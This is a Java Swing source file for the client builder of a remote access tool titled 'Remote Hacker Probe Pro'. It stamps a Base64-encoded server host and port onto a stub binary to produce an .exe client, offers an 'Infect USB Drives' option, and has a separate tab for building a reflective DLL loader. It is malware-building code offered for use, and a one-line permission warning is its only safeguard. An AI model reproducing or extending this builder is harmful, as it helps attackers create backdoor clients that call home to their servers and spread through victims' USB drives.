package rhp;

import javax.swing.*;
import javax.swing.border.EmptyBorder;
import javax.swing.filechooser.FileNameExtensionFilter;
import java.awt.*;
import java.io.*;
import org.apache.commons.codec.binary.Base64;

public class Builder extends JDialog {
    private final JTextField portValue;
	private final JTextField reflectiveHost;
	private final JTextField reflectivePort;
	private static JCheckBox usb;

	// Utility method to copy file
	private static void copyFile(File source, File dest) throws IOException {
		try (InputStream is = new FileInputStream(source);
			 OutputStream os = new FileOutputStream(dest)) {
			byte[] buffer = new byte[1024];
			int length;
			while ((length = is.read(buffer)) > 0) {
				os.write(buffer, 0, length);
			}
		}
	}

	// Build method to generate the client
	public static void build(Boolean isLoader, String filePath, String host, String port) {
		File stub = isLoader ? new File("reflective_bin") : new File("probe_bin");

		// Validate if stub file exists and is not a directory
		if (!stub.exists() || stub.isDirectory()) {
			JOptionPane.showMessageDialog(null,
					"ERROR: Missing or invalid stub file ('" + stub.getName() + "'). Ensure the correct file exists.");
			return;
		}

		String usbThread = usb.isSelected() ? "1" : "0";
		String fullValue = host + ":" + port + ":" + usbThread;
		File destination = new File(filePath);

		try {
			// Copy stub to destination and append client-specific data
			copyFile(stub, destination);
			try (FileWriter writer = new FileWriter(destination, true)) {
				writer.write("\n\n" + fullValue);
			}
			JOptionPane.showMessageDialog(null, "Built Client: " + destination);
		} catch (IOException e) {
			JOptionPane.showMessageDialog(null, "Error writing to file: " + e.getMessage());
		}
	}

	// Constructor to set up the GUI
	public Builder() {
		setResizable(false);
		setDefaultCloseOperation(JDialog.DISPOSE_ON_CLOSE);
		setTitle("Remote Hacker Probe Pro | Client Builder");
		setBounds(100, 100, 405, 252);
		getContentPane().setLayout(new BorderLayout());
        JPanel contentPanel = new JPanel();
        contentPanel.setBorder(new EmptyBorder(5, 5, 5, 5));
		getContentPane().add(contentPanel, BorderLayout.CENTER);
		contentPanel.setLayout(null);

		JTabbedPane tabbedPane = new JTabbedPane(JTabbedPane.TOP);
		tabbedPane.setBounds(0, 0, 499, 289);
		contentPanel.add(tabbedPane);

		// Probe Client Tab
		JPanel probeClientPanel = new JPanel();
		tabbedPane.addTab("Probe Client", null, probeClientPanel, null);
		probeClientPanel.setLayout(null);

		JLabel lblHost = new JLabel("Server Host :");
		lblHost.setFont(new Font("Calibri", Font.PLAIN, 12));
		lblHost.setBounds(5, 36, 74, 31);
		probeClientPanel.add(lblHost);

		JTextField hostValue = new JTextField();
		hostValue.setFont(new Font("Consolas", Font.PLAIN, 12));
		hostValue.setColumns(10);
		hostValue.setBounds(83, 31, 301, 41);
		probeClientPanel.add(hostValue);

		JLabel lblPort = new JLabel("Server Port :");
		lblPort.setFont(new Font("Calibri", Font.PLAIN, 12));
		lblPort.setBounds(5, 100, 74, 14);
		probeClientPanel.add(lblPort);

		portValue = new JTextField();
		portValue.setFont(new Font("Consolas", Font.PLAIN, 12));
		portValue.setColumns(10);
		portValue.setBounds(83, 83, 301, 41);
		probeClientPanel.add(portValue);

		usb = new JCheckBox("Infect USB Drives");
		usb.setFont(new Font("Calibri", Font.PLAIN, 12));
		usb.setBounds(6, 163, 198, 23);
		probeClientPanel.add(usb);

		JButton btnBuildProbe = new JButton("Build");
		btnBuildProbe.addActionListener(e -> {
            String host = hostValue.getText();
            String port = portValue.getText();

            if (host.isEmpty() || port.isEmpty()) {
                JOptionPane.showMessageDialog(null, "Host and Port cannot be empty!");
                return;
            }

            byte[] encodedHost = Base64.encodeBase64(host.getBytes());
            byte[] encodedPort = Base64.encodeBase64(port.getBytes());

            JFileChooser fileChooser = new JFileChooser();
            fileChooser.setFileFilter(new FileNameExtensionFilter("EXE File", "exe"));
            fileChooser.setDialogTitle("Select location to save the file");
            int userSelection = fileChooser.showSaveDialog(null);

            if (userSelection == JFileChooser.APPROVE_OPTION) {
                File fileToSave = fileChooser.getSelectedFile();
                build(false, fileToSave.getAbsolutePath() + ".exe", new String(encodedHost), new String(encodedPort));
            }
        });
		btnBuildProbe.setFont(new Font("Calibri", Font.BOLD, 12));
		btnBuildProbe.setBounds(222, 163, 162, 23);
		probeClientPanel.add(btnBuildProbe);

		JLabel lblWarning = new JLabel("Only run where you have permission to do so!");
		lblWarning.setFont(new Font("Calibri", Font.PLAIN, 12));
		lblWarning.setBounds(5, 6, 277, 14);
		probeClientPanel.add(lblWarning);

		// DLL Loader Tab
		JPanel dllLoaderPanel = new JPanel();
		tabbedPane.addTab("DLL Loader", null, dllLoaderPanel, null);
		dllLoaderPanel.setLayout(null);

		JLabel lblReflectiveHost = new JLabel("Server Host :");
		lblReflectiveHost.setFont(new Font("Calibri", Font.PLAIN, 12));
		lblReflectiveHost.setBounds(10, 52, 74, 31);
		dllLoaderPanel.add(lblReflectiveHost);

		reflectiveHost = new JTextField();
		reflectiveHost.setFont(new Font("Consolas", Font.PLAIN, 12));
		reflectiveHost.setColumns(10);
		reflectiveHost.setBounds(81, 47, 301, 42);
		dllLoaderPanel.add(reflectiveHost);

		JLabel lblReflectivePort = new JLabel("Server Port :");
		lblReflectivePort.setFont(new Font("Calibri", Font.PLAIN, 12));
		lblReflectivePort.setBounds(10, 114, 74, 14);
		dllLoaderPanel.add(lblReflectivePort);

		reflectivePort = new JTextField();
		reflectivePort.setFont(new Font("Consolas", Font.PLAIN, 12));
		reflectivePort.setColumns(10);
		reflectivePort.setBounds(81, 100, 301, 41);
		dllLoaderPanel.add(reflectivePort);

		JButton btnBuildLoader = new JButton("Build");
		btnBuildLoader.addActionListener(e -> {
            String host = reflectiveHost.getText();
            String port = reflectivePort.getText();

            if (host.isEmpty() || port.isEmpty()) {
                JOptionPane.showMessageDialog(null, "Host and Port cannot be empty!");
                return;
            }

            byte[] encodedHost = Base64.encodeBase64(host.getBytes());
            byte[] encodedPort = Base64.encodeBase64(port.getBytes());

            JFileChooser fileChooser = new JFileChooser();
            fileChooser.setFileFilter(new FileNameExtensionFilter("EXE File", "exe"));
            fileChooser.setDialogTitle("Select location to save the file");
            int userSelection = fileChooser.showSaveDialog(null);

            if (userSelection == JFileChooser.APPROVE_OPTION) {
                File fileToSave = fileChooser.getSelectedFile();
                build(true, fileToSave.getAbsolutePath() + ".exe", new String(encodedHost), new String(encodedPort));
            }
        });
		btnBuildLoader.setFont(new Font("Calibri", Font.BOLD, 12));
		btnBuildLoader.setBounds(220, 164, 162, 23);
		dllLoaderPanel.add(btnBuildLoader);
	}

	public static void main(String[] args) {
		try {
			Builder dialog = new Builder();
			dialog.setDefaultCloseOperation(JDialog.DISPOSE_ON_CLOSE);
			dialog.setVisible(true);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
}